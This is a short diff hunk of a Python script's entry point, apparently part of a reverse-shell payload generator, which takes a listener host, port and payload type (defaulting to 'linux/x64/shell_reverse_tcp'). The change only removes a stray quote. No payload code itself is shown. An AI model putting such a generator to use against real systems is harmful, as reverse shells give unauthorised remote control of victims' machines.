@@ -40,4 +40,4 @@ if __name__ == "__main__":
     lhost = sys.argv[1]
     lport = sys.argv[2]
     payload = sys.argv[3] if len(sys.argv) > 3 else "linux/x64/shell_reverse_tcp"
-    generate(lhost, lport, payload)'' 
+    generate(lhost, lport, payload)
